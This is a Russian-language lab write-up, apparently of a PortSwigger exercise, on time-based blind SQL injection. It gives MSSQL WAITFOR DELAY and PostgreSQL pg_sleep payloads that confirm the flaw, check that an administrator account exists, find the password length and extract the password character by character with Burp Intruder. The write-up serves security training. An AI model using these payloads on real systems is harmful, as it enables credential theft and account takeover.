# Blind SQL injection with time delays and information retrieval

## Theory

<h3>Использование слепых SQL-инъекций путем использования временных задержек</h3>

В этой ситуации часто можно использовать уязвимость слепой инъекции SQL, вызывая временные задержки, в зависимости от введенного условия. Поскольку SQL-запросы обычно обрабатываются приложением синхронно, задержка выполнения SQL-запроса также приведет к задержке ответа HTTP. Это позволяет нам сделать вывод об истинности внедренного условия на основе времени, затраченного до получения ответа HTTP.

Методы запуска временной задержки сильно зависят от типа используемой базы данных. В Microsoft SQL Server следующий запрос может использоваться для проверки условия и запуска задержки в зависимости от того, истинно ли выражение:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
```

Первый из этих входов не вызовет задержку, потому что условие **1=2** ложно. Второй вход вызовет задержку в 10 секунд, потому что условие **1=1** истинно.

Используя эту технику, мы можем получать данные, проверяя по одному символу за раз:
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--
```

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/1.png)

Выбираем пункт Pets. Отправим запрос, чтобы удостовериться, что страница уязвима к SQL-иньекции, и что страница возвращает ответ через некоторый промежуток времени.
```
e60'||(select+pg_sleep(3))--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/2.png)

Используем поведение приложения для проверки условий. Отправим следующий запрос. Оператор CASE проверяет условие и оценивает одно выражение, если условие истинно, и другое выражение, если условие ложно. Первое выражение вызовет задержку на 3 секунды. Второе отправит запрос без задержки.

```
e60'||(select+case+when+(1=1)+then+pg_sleep(3)+else+pg_sleep(0)+end)--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/3.png)

Проверим, существует ли пользователь с именем Administrator в таблице Users.

```
e60'||(select+case+when+(username='administrator')+then+pg_sleep(3)+else+pg_sleep(0)+end+from+users)--;
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/4.png)

Следующим шагом является определение количества символов в пароле пользователя Administrator. Для этого используем следующий запрос. Изменяем цифру length(password)>19 в запросе, чтобы узнать количество символов в пароле.

```
e60'||(select+case+when+(username='administrator'+and+length(password)>19)+then+pg_sleep(3)+else+pg_sleep(0)+end+from+users)||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/5.png)

После определения длины пароля следующим шагом будет проверка символа в каждой позиции, чтобы определить его значение. Отправляем запрос в Burp Intruder и заключаем нужные нам значения для перебора в специальные символы. Во вкладке **Resource Pool** изменим количество отправки запросов на 1, чтобы точно выдеть символы пароля. Запускаем перебор. Во вкладке **Columns** включаем отображение **Response received**. Получаем пароль.

```
e60'||(select+case+when+(username='administrator'+and+substring(password,1,1)='a')+then+pg_sleep(5)+else+pg_sleep(0)+end+from+users)||';
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/6.png)

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/7.png)

Логинимся под администратора и получаем ответ от приложения.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/SQL_injection/Blind_SQL_injection_with_time_delays_and_information_retrieval/assets/8.png)
